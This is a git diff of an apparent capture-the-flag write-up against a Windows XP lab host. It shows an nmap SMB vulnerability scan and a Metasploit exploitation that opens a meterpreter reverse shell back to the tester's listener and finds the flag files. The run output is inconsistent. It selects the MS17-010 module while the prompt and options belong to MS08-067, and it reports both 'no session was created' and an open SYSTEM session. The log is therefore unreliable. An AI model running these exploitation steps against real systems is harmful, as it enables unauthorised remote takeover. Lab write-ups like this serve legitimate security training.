@@ -53,6 +53,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 77.71 seconds
 ```
 
+## Vulnerability analysis and exploitation
 Let's check the port 445 for vulnerabilities:
 ```
 $ nmap --script=vuln -Pn -p445 10.10.10.4
@@ -99,8 +100,8 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
 ```
 
-Metasploit:
-```
+Search and exploit on Metasploit:
+``` Bash
 msf5 > search ms17-010
 
 Matching Modules
@@ -115,37 +116,23 @@ Matching Modules
    4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
    5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
 
-```
-
-```
-msf5 > use windows/smb/ms17_010_psexec
-
-msf5 exploit(windows/smb/ms17_010_psexec) > options
-
-Module options (exploit/windows/smb/ms17_010_psexec):
-
-   Name                  Current Setting                                                 Required  Description
-   ----                  ---------------                                                 --------  -----------
-   DBGTRACE              false                                                           yes       Show extra debug trace info
-   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
-   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
-   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
-   RHOSTS                10.10.10.4                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   RPORT                 445                                                             yes       The Target port
-   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
-   SERVICE_DISPLAY_NAME                                                                  no        The service display name
-   SERVICE_NAME                                                                          no        The service name
-   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
-   SMBDomain             .                                                               no        The Windows domain to use for authentication
-   SMBPass                                                                               no        The password for the specified username
-   SMBUser                                                                               no        The username to authenticate as
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+msf5 > use exploit/windows/smb/ms17_010_psexec
+msf5 exploit(windows/smb/ms08_067_netapi) > options                                            
+                                                                                               
+Module options (exploit/windows/smb/ms08_067_netapi):                                          
+                                                                                               
+   Name     Current Setting  Required  Description                                             
+   ----     ---------------  --------  -----------                                             
+   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'                                                                     
+   RPORT    445              yes       The SMB service port (TCP)                              
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)                  
+                                                                                               
+                                                                                               
+Payload options (windows/meterpreter/reverse_tcp):                                             
+                                                                                               
+   Name      Current Setting  Required  Description                                            
+   ----      ---------------  --------  -----------                                            
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)                                                                                             
    LHOST     10.10.14.32      yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
@@ -154,7 +141,39 @@ Exploit target:
 
    Id  Name
    --  ----
-   0   Automatic
+   0   Automatic Targeting
 
 
+msf5 exploit(windows/smb/ms08_067_netapi) > run
 
+[*] Started reverse TCP handler on 10.10.14.32:4444 
+[*] Sending stage (176195 bytes) to 10.10.10.4
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] Meterpreter session 1 opened (10.10.14.32:4444 -> 10.10.10.4:1057) at 2020-08-26 12:38:33 -0400
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
+[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[-] 10.10.10.4:445 - Exploit failed: Rex::Proto::SMB::Exceptions::NoReply The SMB server did not reply to our request
+[*] Exploit completed, but no session was created.
+msf5 exploit(windows/smb/ms08_067_netapi) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ LEGACY  10.10.14.32:4444 -> 10.10.10.4:1057 (10.10.10.4)
+
+msf5 exploit(windows/smb/ms08_067_netapi) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > search -f user.txt
+Found 1 result...
+    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
+meterpreter > search -f root.txt
+Found 1 result...
+    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
+meterpreter >
+```
+                                                                                               
+                            
